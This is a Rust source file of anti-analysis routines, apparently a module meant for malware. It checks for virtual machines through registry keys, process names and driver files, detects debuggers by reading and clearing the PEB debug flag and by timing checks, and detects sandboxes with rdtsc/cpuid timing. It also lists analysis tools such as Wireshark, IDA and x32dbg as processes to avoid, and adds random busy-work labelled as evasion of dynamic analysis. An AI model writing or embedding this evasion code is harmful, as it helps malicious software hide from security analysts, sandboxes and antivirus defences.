use rand::Rng;
use std::arch::asm;
use std::fs;
use std::ptr;
use std::thread;
use sysinfo::{ProcessExt, SystemExt};

#[cfg(target_os = "windows")]
use winapi::{
    shared::
        minwindef::FILETIME,
    um::{
        minwinbase::SYSTEMTIME,
        sysinfoapi::GetLocalTime,
        timezoneapi::SystemTimeToFileTime,
    },
};
#[cfg(target_os = "windows")]
use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};

const PROC_BANNED_VM: [&str; 6] = [
    "Vmtoolsd.exe",
    "Vmwaretrat.exe",
    "Vmwareuser.exe",
    "Vmwareuser.exe",
    "vm_process.exe",
    "VmRemoteGuest.exe",
];

const PROC_BANNED_DBG: [&str; 32] = [
    "http toolkit.exe",
    "httpdebuggerui.exe",
    "wireshark.exe",
    "fiddler.exe",
    "charles.exe",
    "regedit.exe",
    "cmd.exe",
    "taskmgr.exe",
    "vboxservice.exe",
    "df5serv.exe",
    "processhacker.exe",
    "vboxtray.exe",
    "vmtoolsd.exe",
    "vmwaretray.exe",
    "ida64.exe",
    "ollydbg.exe",
    "pestudio.exe",
    "vmwareuser",
    "vgauthservice.exe",
    "vmacthlp.exe",
    "x96dbg.exe",
    "vmsrvc.exe",
    "x32dbg.exe",
    "vmusrvc.exe",
    "prl_cc.exe",
    "prl_tools.exe",
    "qemu-ga.exe",
    "joeboxcontrol.exe",
    "ksdumperclient.exe",
    "ksdumper.exe",
    "joeboxserver.exe",
    "xenservice.exe",
];

const PATH_BANNED: [&str; 4] = [
    "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
    "C:\\windows\\System32\\Drivers\\vm3dgl.dll",
    "C:\\windows\\System32\\vmdum.dll",
    "C:\\windows\\System32\\Drivers\\VBoxGuest.sys",
];

const WINREG_HKLM_PATH: [&str; 41] = [
    "Software\\Classes\\Folder\\shell\\sandbox",
    "SOFTWARE\\Microsoft\\Hyper-V",
    "SOFTWARE\\Microsoft\\VirtualMachine",
    "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
    "SYSTEM\\ControlSet001\\Services\\vmicheartbeat",
    "SYSTEM\\ControlSet001\\Services\\vmicvss",
    "SYSTEM\\ControlSet001\\Services\\vmicshutdown",
    "SYSTEM\\ControlSet001\\Services\\vmicexchange",
    "SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_1AB8*",
    "SYSTEM\\CurrentControlSet\\Services\\SbieDrv",
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Sandboxie",
    "HARDWARE\\ACPI\\DSDT\\VBOX__",
    "HARDWARE\\ACPI\\FADT\\VBOX__",
    "HARDWARE\\ACPI\\RSDT\\VBOX__",
    "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
    "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
    "SYSTEM\\ControlSet001\\Services\\VBoxMouse",
    "SYSTEM\\ControlSet001\\Services\\VBoxService",
    "SYSTEM\\ControlSet001\\Services\\VBoxSF",
    "SYSTEM\\ControlSet001\\Services\\VBoxVideo",
    "SYSTEM\\ControlSet001\\Services\\vpcbus",
    "SYSTEM\\ControlSet001\\Services\\vpc-s3",
    "SYSTEM\\ControlSet001\\Services\\vpcuhub",
    "SYSTEM\\ControlSet001\\Services\\msvmmouf",
    "SOFTWARE\\VMware, Inc.\\VMware Tools",
    "SYSTEM\\ControlSet001\\Services\\vmdebug",
    "SYSTEM\\ControlSet001\\Services\\vmmouse",
    "SYSTEM\\ControlSet001\\Services\\VMTools",
    "SYSTEM\\ControlSet001\\Services\\VMMEMCTL",
    "SYSTEM\\ControlSet001\\Services\\vmware",
    "SYSTEM\\ControlSet001\\Services\\vmci",
    "SYSTEM\\ControlSet001\\Services\\vmx86",
    "SOFTWARE\\Wine",
    "HARDWARE\\ACPI\\DSDT\\xen",
    "HARDWARE\\ACPI\\FADT\\xen",
    "HARDWARE\\ACPI\\RSDT\\xen",
    "SYSTEM\\ControlSet001\\Services\\xenevtchn",
    "SYSTEM\\ControlSet001\\Services\\xennet",
    "SYSTEM\\ControlSet001\\Services\\xennet6",
    "SYSTEM\\ControlSet001\\Services\\xensvc",
    "SYSTEM\\ControlSet001\\Services\\xenvdb",
];

struct Fibonacci {
    x: i32,
}

struct Counting {
    x: i32,
}

struct SeriesTylor {
    x: i32,
    range: i32,
}

trait PolyEx {
    fn run(self) -> i32;
}

impl PolyEx for Fibonacci {
    fn run(self) -> i32 {
        let mut a = 0;
        let mut b = 1;
        let mut result = 0;

        for _ in 0..self.x {
            result = a + b;
            a = b;
            b = result;
        }

        result
    }
}

impl PolyEx for SeriesTylor {
    fn run(self) -> i32 {
        fn factorial(n: i32) -> f32 {
            if n <= 1 {
                1.0
            } else {
                (2..=n).map(|x| x as f32).product()
            }
        }

        let x = self.x as f32;
        let mut e_to_2: i32 = 0;

        for i in 0..self.range {
            e_to_2 += (x.powi(i) / factorial(i)) as i32;
        }

        e_to_2
    }
}

impl PolyEx for Counting {
    fn run(self) -> i32 {
        let mut c = 0;

        for _ in 0..self.x {
            c += 1;
        }

        return c;
    }
}

pub fn antivm() -> bool {
    
    // --- WinReg check ---

    #[cfg(target_os = "windows")]
    {
        #[allow(unused_variables)]
        for path_winreg in WINREG_HKLM_PATH {
            let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
            if hklm.open_subkey(path_winreg).is_ok() {
                return true;
            }
        }
    }


    // --- Process check ---

    let mut system = sysinfo::System::new_all();
    system.refresh_processes();

    for (_pid, proc) in system.processes().iter() {
        if PROC_BANNED_VM.iter().any(|v| v == &proc.name()) {
            return true;
        }
    }

    // --- Path check ---

    for path in PATH_BANNED.iter() {
        if fs::metadata(path).is_ok() {
            return true;
        }
    }

    // ??: MAC ADDR CHECK REMOVED

    false
}

pub fn antidbg() -> bool {
    // --- Low Level Antivm check ---

    // === PEB & Time check ===

    #[cfg(target_os = "windows")]
    {
        let qw_native_elapsed = 1000;
        let timedbg: bool;

        let bv = unsafe {
            let mut st_start: SYSTEMTIME = std::mem::zeroed();
            let mut st_end: SYSTEMTIME = std::mem::zeroed();

            let mut ft_start: FILETIME = std::mem::zeroed();
            let mut ft_end: FILETIME = std::mem::zeroed();

            let peb: usize;
            let bv: usize;

            GetLocalTime(&mut st_start);

            #[cfg(target_arch = "x86_64")]
            asm!("mov {}, gs:[60h]", out(reg) peb);

            #[cfg(target_arch = "x86")]
            asm!("mov {}, fs:[30h]", out(reg) peb);

            asm!("movzx {}, byte ptr [{} + 2h]", out(reg) bv, in(reg) peb);

            if bv != 0 {
                ptr::write((peb + 2) as *mut u8, 0u8);
            }

            GetLocalTime(&mut st_end);

            if SystemTimeToFileTime(&st_start, &mut ft_start) == 0
                || SystemTimeToFileTime(&st_end, &mut ft_end) == 0
            {
                timedbg = false;
            } else {
                let ui_start = u64::from(ft_start.dwLowDateTime)
                    | ((u64::from(ft_start.dwHighDateTime)) << 32);
                let ui_end =
                    u64::from(ft_end.dwLowDateTime) | ((u64::from(ft_end.dwHighDateTime)) << 32);

                timedbg = (ui_end - ui_start) > qw_native_elapsed;
            }

            bv
        };

        if bv != 0 || timedbg {
            return true;
        }
    }

    // --- Process check ---

    let mut system = sysinfo::System::new_all();
    system.refresh_processes();

    for (_pid, proc) in system.processes().iter() {
        if PROC_BANNED_DBG.iter().any(|v| v == &proc.name()) {
            return true;
        }
    }

    false
}

// \\\ Check if runned a sandbox \\\
pub fn antisnb() -> bool {
    #[allow(unused_assignments)]
    let mut tsc: u64 = 0;
    let mut acc: u64 = 0;

    // ? 100 CPU cycles
    for _ in 0..100 {
        unsafe {
            // --- Start cycles---
            tsc = core::arch::x86_64::_rdtsc() as u64;

            let _out = core::arch::x86_64::__cpuid_count(0, 0).edx;
            acc += (core::arch::x86_64::_rdtsc() as u64) - tsc;
        }
    }

    if (acc / 100) > 300 {
        return true;
    }

    return false;
}

// \\\ Evasion of dynamic analysis with \\\
pub fn r_behavior() {
    for _ in 0..5 {
        let random_n = rand::thread_rng().gen_range(1..=3);

        match random_n {
            1 => Fibonacci::run(Fibonacci { x: 60 }),
            2 => SeriesTylor::run(SeriesTylor { x: 5, range: 20 }),
            3 => Counting::run(Counting { x: 10000 }),
            _ => 0,
        };
        thread::sleep(std::time::Duration::from_secs_f32(0.5))
    }
}
